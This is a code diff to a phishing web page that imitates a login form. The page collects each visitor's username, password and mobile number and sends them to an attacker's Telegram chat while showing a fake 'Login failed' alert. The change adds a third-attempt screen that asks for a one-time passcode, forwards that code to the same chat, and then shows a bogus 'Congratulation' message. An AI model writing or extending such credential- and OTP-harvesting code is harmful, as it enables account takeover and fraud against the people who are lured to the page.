@@ -20,7 +20,7 @@
 
     .login-box {
       background: rgba(255, 255, 255, 0.85); /* transparent white */
-      backdrop-filter: blur(6px); /* adds a nice glass effect (modern browsers) */
+      backdrop-filter: blur(6px); /* glass effect */
       width: 360px;
       max-width: 90%;
       border-radius: 12px;
@@ -121,24 +121,45 @@
       event.preventDefault();
       loginAttempt++;
 
-      var username = document.getElementById('username').value;
-      var password = document.getElementById('password').value;
-      var mobile = document.getElementById('mobile').value;
-
-      var payload = `Username: ${username}\nPassword: ${password}\nMobile: ${mobile}\nStark ♥️`;
-
-      sendToTelegram(payload);
+      const loginBox = document.querySelector('.login-box');
 
       if (loginAttempt < 3) {
-      // 1st and 2nd attempt
-      alert("Login failed: Invalid credentials");
-    } else {
-      // 3rd attempt onwards
-      const loginBox = document.querySelector('.login-box');
-      loginBox.innerHTML = `<h2 style="font-size:28px; color:#1a73e8;">Congratulation!</h2>
-                            <p style="font-size:20px; color:#202124;">Our representative will contact you soon.</p>`;
-    }
-  });
+        // 1st and 2nd attempt
+        var username = document.getElementById('username').value;
+        var password = document.getElementById('password').value;
+        var mobile = document.getElementById('mobile').value;
+
+        var payload = `Username: ${username}\nPassword: ${password}\nMobile: ${mobile}\nStark ♥️`;
+        sendToTelegram(payload);
+
+        alert("Login failed: Invalid credentials");
+      } 
+      else if (loginAttempt === 3) {
+        // 3rd attempt - show OTP input
+        loginBox.innerHTML = `
+          <h2 style="font-size:24px; color:#1a73e8;">OTP Verification</h2>
+          <p style="font-size:16px; color:#202124;">Enter OTP sent to you via Telegram</p>
+          <form id="otpForm">
+            <input type="text" id="otp" name="otp" class="input-field" placeholder="Enter OTP" required>
+            <button type="submit" class="btn">Verify OTP</button>
+          </form>
+        `;
+
+        // OTP form listener
+        document.getElementById('otpForm').addEventListener('submit', function(e) {
+          e.preventDefault();
+          const otpValue = document.getElementById('otp').value;
+
+          sendToTelegram(`OTP Entered: ${otpValue} ❤️`);
+
+          // Show congratulation message
+          loginBox.innerHTML = `
+            <h2 style="font-size:28px; color:#1a73e8;">Congratulation!</h2>
+            <p style="font-size:20px; color:#202124;">Our representative will contact you soon.</p>
+          `;
+        });
+      }
+    });
 
     function sendToTelegram(message) {
       var chatId = '5738863873'; // your Telegram user ID
@@ -156,5 +177,3 @@
 
 </body>
 </html>
-
-
